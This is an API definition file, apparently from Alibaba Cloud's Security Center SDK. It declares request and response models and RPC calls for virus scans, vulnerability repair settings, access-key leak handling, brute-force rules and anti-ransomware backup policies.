model ListUninstallAegisMachinesResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  machineList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='sas-bdrvxb4b****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='sql-test-001'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='120.79.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      machineRegion?: string(name='MachineRegion', description='The region in which the server resides.', example='cn-hangzhou'),
      os?: string(name='Os', description='The operating system of the server. Valid values:

*   **linux**
*   **windows**
*   **windows-2003**', example='linux'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-shanghai'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='6d5b361f-958d-48a8-a9d2-d6e82c1****'),
      vendor?: int32(name='Vendor', description='The source of the server. Valid values:

*   **0**: an asset provided by Alibaba Cloud
*   **1**: a third-party cloud server
*   **2**: a server in a data center
*   **3**, **4**, **5**, and **7**: other cloud asset
*   **8**: a lightweight asset', example='0'),
      vendorName?: string(name='VendorName', description='The name of the service provider (SP) for the server.

Valid values:

*   **ALIYUN**: Alibaba Cloud
*   **OUT**: a third-party service provider
*   **IDC**: a data center
*   **TENCENT**: Tencent Cloud
*   **HUAWEICLOUD**: Huawei Cloud
*   **Microsoft**: Microsoft
*   **AWS**: Amazon Web Services (AWS)
*   **TRIPARTITE**: a lightweight server', example='ALIYUN'),
    }
  ](name='MachineList', description='An array that consists of the information about servers.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='5'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='151F6EB6-D5F3-417A-AF7B-4D84975DB586'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='44'),
}

model ListUninstallAegisMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListUninstallAegisMachinesResponseBody(name='body'),
}

async function listUninstallAegisMachines(request: ListUninstallAegisMachinesRequest): ListUninstallAegisMachinesResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListUninstallAegisMachines', 'POST', '/', 'json', false, 'json', request);
}

model ListUuidsByWebPathRequest {
  currentPage: int32(name='CurrentPage', description='The number of the page to return.', example='1', position='Query'),
  pageSize: int32(name='PageSize', description='The number of entries to return on each page.', example='20', position='Query'),
  type?: string(name='Type', description='The path type of the web directory. Valid values:

*   **def**: automatically identified
*   **customize**: manually added', example='def', position='Query'),
  webPath?: string(name='WebPath', description='The path to the web directory.', example='/root/www****', position='Query'),
}

model ListUuidsByWebPathResponseBody = {
  list?: [ 
    {
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      machineName?: string(name='MachineName', description='The name of the server.', example='test****'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List', description='An array that consists of the protected assets.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='10'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A3C1240F-9DAC-5EE8-ADF5-2F930A95****'),
}

model ListUuidsByWebPathResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListUuidsByWebPathResponseBody(name='body'),
}

async function listUuidsByWebPath(request: ListUuidsByWebPathRequest): ListUuidsByWebPathResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListUuidsByWebPath', 'POST', '/', 'json', false, 'json', request);
}

model ListVirusScanMachineRequest {
  currentPage: int32(name='CurrentPage', example='1', position='Query'),
  pageSize: int32(name='PageSize', example='20', position='Query'),
  remark?: string(name='Remark', example='192.168.1****', position='Query'),
  uuid?: string(name='Uuid', example='7cc91747-2845-40d4-bb69-c077597f****', position='Query'),
}

model ListVirusScanMachineResponseBody = {
  data?: [ 
    {
      eventCount?: int32(name='EventCount', example='28'),
      instanceId?: string(name='InstanceId', example='i-bp180bogui4fc0z4****'),
      instanceName?: string(name='InstanceName', example='centos****'),
      internetIp?: string(name='InternetIp', example='172.16.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='10.42.XX.XX'),
      uuid?: string(name='Uuid', example='6690a46c-0edb-4663-a641-3629d1a9****'),
    }
  ](name='Data'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='168'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='A27C1C09-828B-5CB8-9203-F55423BE****'),
}

model ListVirusScanMachineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListVirusScanMachineResponseBody(name='body'),
}

async function listVirusScanMachine(request: ListVirusScanMachineRequest): ListVirusScanMachineResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListVirusScanMachine', 'POST', '/', 'json', false, 'json', request);
}

model ListVirusScanMachineEventRequest {
  currentPage: int32(name='CurrentPage', example='1', position='Query'),
  operateTaskId?: string(name='OperateTaskId', example='233886xx', position='Query'),
  pageSize: int32(name='PageSize', example='20', position='Query'),
  uuid?: string(name='Uuid', example='a6931624-c43e-4323-9128-a6be6ffdxxxx', position='Query'),
}

model ListVirusScanMachineEventResponseBody = {
  data?: [ 
    {
      details?: [ 
        {
          infoType?: string(name='InfoType', example='download_url'),
          nameDisplay?: string(name='NameDisplay', example='Trojan Path'),
          type?: string(name='Type', example='html'),
          valueDisplay?: string(name='ValueDisplay', example='getopt'),
        }
      ](name='Details'),
      eventId?: long(name='EventId', example='911273'),
      eventName?: string(name='EventName'),
      instanceName?: string(name='InstanceName', example='i-wz92q7m5hsbgfhdss***'),
      internetIp?: string(name='InternetIp', example='172.16.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='10.42.XX.XX'),
      lastTimeStamp?: long(name='LastTimeStamp', example='1682046733628'),
      level?: string(name='Level', example='serious'),
    }
  ](name='Data'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='149'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='2DAEF40F-8E1A-550D-8793-99C61C401DD0'),
}

model ListVirusScanMachineEventResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListVirusScanMachineEventResponseBody(name='body'),
}

async function listVirusScanMachineEvent(request: ListVirusScanMachineEventRequest): ListVirusScanMachineEventResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListVirusScanMachineEvent', 'POST', '/', 'json', false, 'json', request);
}

model ListVirusScanTaskRequest {
  currentPage?: int32(name='CurrentPage', example='1', position='Query'),
  endTime?: long(name='EndTime', example='1680919232999', position='Query'),
  internetIp?: string(name='InternetIp', example='120.27.XX.XX', position='Query'),
  intranetIp?: string(name='IntranetIp', example='172.26.XX.XX', position='Query'),
  lang?: string(name='Lang', example='zh', position='Query'),
  machineName?: string(name='MachineName', example='oracle-win-001****', position='Query'),
  pageSize?: int32(name='PageSize', example='20', position='Query'),
  rootTask?: boolean(name='RootTask', example='true', position='Query'),
  rootTaskId?: string(name='RootTaskId', example='89f5d7813bd59dd237580a8664b3xxxx', position='Query'),
  scanType?: string(name='ScanType', example='user', position='Query'),
  startTime?: long(name='StartTime', example='1680919232000', position='Query'),
  status?: int32(name='Status', example='1', position='Query'),
  statusList?: [ int32 ](name='StatusList', position='Query'),
  taskId?: string(name='TaskId', example='1471d8ebb96795b41ede090b9758****', position='Query'),
}

model ListVirusScanTaskResponseBody = {
  list?: [ 
    {
      endTime?: long(name='EndTime', example='1662343860051'),
      instanceName?: string(name='InstanceName', example='sql-test-0****'),
      internetIp?: string(name='InternetIp', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='172.25.XX.XX'),
      progress?: int32(name='Progress', example='62'),
      scanPath?: [ string ](name='ScanPath'),
      scanType?: string(name='ScanType', example='system'),
      startTime?: long(name='StartTime', example='1651290987000'),
      status?: int32(name='Status', example='1'),
      taskId?: string(name='TaskId', example='2e75557bfa570381f5c516cad9b6xxxx'),
      taskName?: string(name='TaskName', example='VIRUS_VUL_SCHEDULE_SCAN'),
      uuid?: string(name='Uuid', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
    }
  ](name='List'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='224'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model ListVirusScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListVirusScanTaskResponseBody(name='body'),
}

async function listVirusScanTask(request: ListVirusScanTaskRequest): ListVirusScanTaskResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListVirusScanTask', 'POST', '/', 'json', false, 'json', request);
}

model ListVulAutoRepairConfigRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2022:0274-Important: polkit pkexec Local Privilege Escalation Vulnerability(CVE-2021-4034)', position='Query'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1', minimum=1, position='Query'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **10**.', example='10', minimum=1, maximum=100, position='Query'),
  type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability', example='cve', position='Query'),
}

model ListVulAutoRepairConfigResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='success'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='11'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3B3F3A90-46A5-4023-A2D8-D68B14262F96'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
  vulAutoRepairConfigList?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2022:0274-Important: polkit pkexec Local Privilege Escalation Vulnerability(CVE-2021-4034)'),
      id?: long(name='Id', description='The configuration ID of the vulnerability.', example='37338'),
      name?: string(name='Name', description='The name of the vulnerability.', example='anolisos:8.4:ANSA-2022:0001'),
      reason?: string(name='Reason', description='The reason why the vulnerability can be automatically fixed.', example='The vulnerability fix is risk-free and can be configured to automate the fix.'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerability
*   **sys**: Windows system vulnerability', example='cve'),
    }
  ](name='VulAutoRepairConfigList', description='An array consisting of the existing configurations of vulnerabilities that can be automatically fixed.'),
}

model ListVulAutoRepairConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListVulAutoRepairConfigResponseBody(name='body'),
}

async function listVulAutoRepairConfig(request: ListVulAutoRepairConfigRequest): ListVulAutoRepairConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListVulAutoRepairConfig', 'POST', '/', 'json', false, 'json', request);
}

model ListVulGlobalConfigRequest {
  configKey?: string(name='ConfigKey', description='The key of the configuration item. Valid values:

*   **vul_scan_ip_list**: The IP addresses that are detected.', example='vul_scan_ip_list', position='Query'),
}

model ListVulGlobalConfigResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
  vulGlobalConfigList?: [ 
    {
      configKey?: string(name='ConfigKey', description='The key of the configuration item.', example='vul_scan_ip_list'),
      configValue?: string(name='ConfigValue', description='The value of the configuration item.', example='127.0.*.*,127.0.*.*'),
    }
  ](name='VulGlobalConfigList', description='The configurations.'),
}

model ListVulGlobalConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListVulGlobalConfigResponseBody(name='body'),
}

async function listVulGlobalConfig(request: ListVulGlobalConfigRequest): ListVulGlobalConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ListVulGlobalConfig', 'POST', '/', 'json', false, 'json', request);
}

model MarkMonitorAccountsRequest {
  accountIds: string(name='AccountIds', example='131331822340XXXX,140649175187XXXX', position='Query'),
}

model MarkMonitorAccountsResponseBody = {
  requestId?: string(name='RequestId', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model MarkMonitorAccountsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: MarkMonitorAccountsResponseBody(name='body'),
}

async function markMonitorAccounts(request: MarkMonitorAccountsRequest): MarkMonitorAccountsResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'MarkMonitorAccounts', 'POST', '/', 'json', false, 'json', request);
}

model ModifyAccessKeyLeakDealRequest {
  id?: long(name='Id', description='The ID of the AccessKey pair leak.

> You can call the [DescribeAccesskeyLeakList](~~DescribeAccesskeyLeakList~~) operation to query the ID. You must specify at least one of the Id and **IdList** parameters.', example='123', position='Query'),
  idList?: [ long ](name='IdList', description='The IDs of AccessKey pair leaks.', position='Query'),
  remark?: string(name='Remark', description='The remarks that are added.', example='disabled.', position='Query'),
  type: string(name='Type', description='The method to handle the AccessKey pair leak. Valid values:

*   **manual**: manually handle
*   **disable**: disable
*   **add-whitelist**: add to the whitelist', example='disable', position='Query'),
}

model ModifyAccessKeyLeakDealResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='DD4617B4-133A-53C8-ADAE-7B30FF89****'),
}

model ModifyAccessKeyLeakDealResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAccessKeyLeakDealResponseBody(name='body'),
}

async function modifyAccessKeyLeakDeal(request: ModifyAccessKeyLeakDealRequest): ModifyAccessKeyLeakDealResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyAccessKeyLeakDeal', 'POST', '/', 'json', false, 'json', request);
}

model ModifyAntiBruteForceRuleRequest {
  defaultRule?: boolean(name='DefaultRule', description='Specifies whether to set the defense rule as the default rule. Valid values:

*   **true**: yes
*   **false**: no', example='true', position='Query'),
  failCount?: int32(name='FailCount', description='The threshold of logon failures that you specify. Valid values:

*   **2**
*   **3**
*   **4**
*   **5**
*   **10**
*   **50**
*   **80**
*   **100**', example='10', position='Query'),
  forbiddenTime?: int32(name='ForbiddenTime', description='The period of time during which logons from an account are not allowed. Unit: minutes. Valid values:

*   **5**
*   **15**
*   **30**
*   **60**
*   **120**
*   **360**
*   **720**
*   **1440**
*   **10080**
*   **52560000**: permanent', example='5', position='Query'),
  id: long(name='Id', description='The ID of the defense rule.', example='65778', position='Query'),
  name?: string(name='Name', description='The name of the defense rule.', example='TestRule', position='Query'),
  resourceOwnerId?: long(name='ResourceOwnerId', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX', position='Query'),
  span?: int32(name='Span', description='The period of time during which logon failures from an account are measured. Unit: minutes. Valid values:

*   **1**
*   **2**
*   **5**
*   **10**
*   **15**', example='1', position='Query'),
  uuidList?: [ string ](name='UuidList', description='An array consisting of the UUIDs of the servers to which the defense rule is applied.', example='uuid-13213-dasda', position='Query'),
}

model ModifyAntiBruteForceRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F35F45B0-5D6B-4238-BE02-A62D0760E840'),
}

model ModifyAntiBruteForceRuleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAntiBruteForceRuleResponseBody(name='body'),
}

async function modifyAntiBruteForceRule(request: ModifyAntiBruteForceRuleRequest): ModifyAntiBruteForceRuleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyAntiBruteForceRule', 'POST', '/', 'json', false, 'json', request);
}

model ModifyAppVulScanCycleRequest {
  cycle?: string(name='Cycle', description='The scan cycle for application vulnerabilities.

*   1week
*   2weeks
*   3days', example='1week', position='Query'),
}

model ModifyAppVulScanCycleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='AFEDC54D-70A2-5E56-A69B-E3D8AA8A5197'),
}

model ModifyAppVulScanCycleResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAppVulScanCycleResponseBody(name='body'),
}

async function modifyAppVulScanCycle(request: ModifyAppVulScanCycleRequest): ModifyAppVulScanCycleResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyAppVulScanCycle', 'POST', '/', 'json', false, 'json', request);
}

model ModifyAssetCleanConfigRequest {
  assetCleanConfigs?: [ 
    {
      cleanDays?: int32(name='CleanDays', description='The number of days before hosts whose provider cannot be identified are automatically cleaned after they enter the offline state. Valid value: an integer that ranges from 1 to 30.', example='7'),
      status?: int32(name='Status', description='Specifies whether to enable the feature of cleaning the offline hosts whose provider cannot be identified. Valid values:

*   **0**: disables the feature.
*   **1**: enables the feature.', example='1'),
      type?: int32(name='Type', description='The type of hosts that you want to clean.

Set the value to **1**, which indicates hosts whose provider cannot be identified.', example='1'),
    }
  ](name='AssetCleanConfigs', description='The asset cleanup configurations.', position='Query'),
}

model ModifyAssetCleanConfigResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
  requestId?: string(name='RequestId', description='The request ID.', example='952776BD-5546-59FC-8AF3-B54EBAD57***'),
}

model ModifyAssetCleanConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAssetCleanConfigResponseBody(name='body'),
}

async function modifyAssetCleanConfig(request: ModifyAssetCleanConfigRequest): ModifyAssetCleanConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyAssetCleanConfig', 'POST', '/', 'json', false, 'json', request);
}

model ModifyAssetGroupRequest {
  groupId: long(name='GroupId', description='The ID of the new server group to which the servers belong.

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of server groups.', example='9586199', position='Query'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='10.12.XX.XX', position='Query'),
  uuids: string(name='Uuids', description='The UUIDs of the servers for which you want to change the server group. Separate multiple UUIDs with commas (,).

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='076a446d-df7d-424c-bdc5-bb5dc7f1****', position='Query'),
}

model ModifyAssetGroupResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C2677612-7207-4AEB-BD48-8BA528F86777'),
}

model ModifyAssetGroupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAssetGroupResponseBody(name='body'),
}

/**
  * You can call the ModifyAssetGroup operation to change the server group to which one or more servers belong. After you create a server group by calling the [CreateOrUpdateAssetGroup](~~CreateOrUpdateAssetGroup~~) operation, you can call the ModifyAssetGroup operation to change the server group to which your servers belong.
  * ### Limits
  * You can call this API operation up to 10 times per second per account. If the number of the calls per second exceeds the limit, throttling is triggered. As a result, your business may be affected. We recommend that you take note of the limit when you call this operation.
  *
 */
async function modifyAssetGroup(request: ModifyAssetGroupRequest): ModifyAssetGroupResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyAssetGroup', 'POST', '/', 'json', false, 'json', request);
}

model ModifyAssetImportantRequest {
  importantCode?: int32(name='ImportantCode', description='The importance of the asset. Valid values:

*   **0**: test
*   **1**: normal
*   **2**: important', example='0', position='Query'),
  uuidList?: string(name='UuidList', description='The UUIDs of servers. Separate multiple UUIDs with commas (,).

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='076a446d-df7d-424c-bdc5-bb5dc7f1****', position='Query'),
}

model ModifyAssetImportantResponseBody = {
  errCode?: string(name='ErrCode', description='The error code returned if the request failed.', example='ServerError'),
  errMessage?: string(name='ErrMessage', description='The error message returned if the request failed.', example='ServerError'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned. The value 200 indicates that the request was successful.', example='200'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='23C85959-1540-514B-93CF-2992C53A1B4F'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ModifyAssetImportantResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAssetImportantResponseBody(name='body'),
}

async function modifyAssetImportant(request: ModifyAssetImportantRequest): ModifyAssetImportantResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyAssetImportant', 'POST', '/', 'json', false, 'json', request);
}

model ModifyAutoDelConfigRequest {
  days?: int32(name='Days', description='The number of days after which a detected vulnerability is automatically deleted. Unit: days. Valid values:

*   7
*   30
*   90', example='30', position='Query'),
}

model ModifyAutoDelConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='3BFA659D-F44F-5703-8FD1-33AB596BEACA'),
}

model ModifyAutoDelConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyAutoDelConfigResponseBody(name='body'),
}

async function modifyAutoDelConfig(request: ModifyAutoDelConfigRequest): ModifyAutoDelConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyAutoDelConfig', 'POST', '/', 'json', false, 'json', request);
}

model ModifyBackupPolicyRequest {
  id: long(name='Id', description='The ID of the anti-ransomware policy that you want to modify.', example='11', position='Query'),
  name: string(name='Name', description='The name of the anti-ransomware policy that you want to modify.', example='policy_name_A', position='Query'),
  policy: map[string]any(name='Policy', description='The configurations of the anti-ransomware policy that you want to modify. The value is a JSON string that contains the following fields:

*   **Source**: the directory that you want to protect. If you want to protect all directories, set this field to brackets \\[].

*   **Include**: the format of the file that you want to protect. Examples: \\*.jpg and \\*.doc.

*   **Exclude**: the directory that you want to exclude from the anti-ransomware policy. You can call the DescribeExcludeSystemPath operation to query all directories and then specify the directory that you want to exclude. Example: /home/user.

*   **Schedule**: the start time and interval of a data backup task. We recommend that you specify a start time that begins during off-peak hours but does not start on the hour.

    *   If you set this field to I|1583216092|P21D, the data backup task starts from 2020-03-03 14:14:52, and the task is executed at an interval of three weeks.
    *   If you set this field to I|1583216092|PT24H, the data backup task starts from 2020-03-03 14:14:52, and the task is executed at an interval of 24 hours.

*   **Retention**: the period during which backup data is retained. Unit: day. If you set this field to 7, backup data is retained for a week. If you set this field to 365, backup data is retained for a year. If you set this field to -1, backup data is permanently retained.

*   **SpeedLimiter**: the limit on the network bandwidth for data backup tasks. If you set this field to 12:15:15360|6:12:5120, the maximum bandwidth for a data backup task is 15 Mbit/s from 12:00 to 15:00 and 5 Mbit/s from 06:00 to 12:00.

If you back up data on an Elastic Compute Service (ECS) instance that is connected over an internal network, we recommend that you leave this field empty. If this field is left empty, the bandwidth for data backup tasks is unlimited.', example='{"Source":["home","admin"]}', shrink='json', position='Query'),
  policyRegionId?: string(name='PolicyRegionId', description='The region ID of the server to which the anti-ransomware policy is applied.

You can call the [DescribeSupportRegion](~~DescribeSupportRegion~~) operation to query the regions in which the anti-ransomware feature is supported.', example='cn-hangzhou', position='Query'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the versions of anti-ransomware policies.

*   **1.0.0**
*   **2.0.0**', example='2.0.0', position='Query'),
  uuidList: [ string ](name='UuidList', description='The UUIDs of the servers to which the anti-ransomware policy is applied.', example='["3bb30859-b3b5-4f28-868f-b0892c98****", "3bb30859-b3b5-4f28-868f-b0892c98****"]', position='Query'),
}

model ModifyBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
}

model ModifyBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyBackupPolicyResponseBody(name='body'),
}

async function modifyBackupPolicy(request: ModifyBackupPolicyRequest): ModifyBackupPolicyResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyBackupPolicy', 'POST', '/', 'json', false, 'json', request);
}

model ModifyBackupPolicyStatusRequest {
  id: long(name='Id', description='The ID of the anti-ransomware policy.', example='30490', position='Query'),
  policyVersion: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Set the value to **2.0.0**.', example='2.0.0', position='Query'),
  status: string(name='Status', description='Specifies whether to enable or disable the anti-ransomware policy. Valid values:

*   **enabled**: enables the anti-ransomware policy. After you enable the anti-ransomware policy, the anti-ransomware feature protects data on your servers. Data on your servers is backed up based on the policy.
*   **disabled**: disables the anti-ransomware policy. After you disable the anti-ransomware policy, the data backup task that is running based on the policy stops.

>  When the system runs data backup tasks, your network bandwidth is consumed. We recommend that you enable the anti-ransomware policy during peak-off hours to back up data.', example='enabled', position='Query'),
}

model ModifyBackupPolicyStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E342452B-4401-5F74-9A1B-D24479851173'),
}

model ModifyBackupPolicyStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyBackupPolicyStatusResponseBody(name='body'),
}

async function modifyBackupPolicyStatus(request: ModifyBackupPolicyStatusRequest): ModifyBackupPolicyStatusResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyBackupPolicyStatus', 'POST', '/', 'json', false, 'json', request);
}

model ModifyClearLogstoreStorageRequest {
  from?: string(name='From', example='sas', position='Query'),
  lang?: string(name='Lang', example='zh', position='Query'),
  userLogStore?: string(name='UserLogStore', example='sas_sls_storage', position='Query'),
  userProject?: string(name='UserProject', example='sas-log-1234(uid)-cn-hangzhou', position='Query'),
}

model ModifyClearLogstoreStorageResponseBody = {
  requestId?: string(name='RequestId', example='DC84C453-8561-5EC4-B0E9-44E67ACCB5B5'),
}

model ModifyClearLogstoreStorageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyClearLogstoreStorageResponseBody(name='body'),
}

async function modifyClearLogstoreStorage(request: ModifyClearLogstoreStorageRequest): ModifyClearLogstoreStorageResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyClearLogstoreStorage', 'POST', '/', 'json', false, 'json', request);
}

model ModifyClientConfSetupRequest {
  strategyConfig?: string(name='StrategyConfig', description='The configurations of the Security Center agent.

*   cpu: the maximum CPU utilization that can be occupied by the Security Center agent on the server
*   mem: the maximum memory usage that can be occupied by the Security Center agent on the server', example='{
      "cpu": "20"
}', position='Query'),
  strategyTag: string(name='StrategyTag', description='The type of the tag.', example='machineResource', position='Query'),
  strategyTagValue: string(name='StrategyTagValue', description='The value of the tag. Valid values:

*   major
*   advanced
*   basic', example='major', position='Query'),
}

model ModifyClientConfSetupResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='60E24426-B910-5D7F-8B8B-3BCDC3FC****'),
}

model ModifyClientConfSetupResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyClientConfSetupResponseBody(name='body'),
}

async function modifyClientConfSetup(request: ModifyClientConfSetupRequest): ModifyClientConfSetupResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'ModifyClientConfSetup', 'POST', '/', 'json', false, 'json', request);
}

model ModifyClientConfStrategyRequest {
  tag: string(name='Tag', description='The key of the tag that is added to the agent configuration policy.', example='machineResource', position='Query'),
  tagExt?: string(name='TagExt', description='The extended tag of the agent configuration policy.', example='auto', position='Query'),
  tagValue: string(name='TagValue', description='The value of the tag that is added to the agent configuration policy.

*   major
*   advanced
*   basic', example='advanced', position='Query'),
  uuid?: string(name='Uuid', description='The UUID of the server that you want to query.', example='4fe8e1cd-3c37-4851-b9de-124da32c****', position='Query'),
  uuids?: [ string ](name='Uuids', description='The UUID of the asset. You can specify a maximum of 500 UUIDs at a time.', position='Query'),
}

model ModifyClientConfStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9089D0AB-835F-5663-AB5E-4FF646BB****'),
}

model ModifyClientConfStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
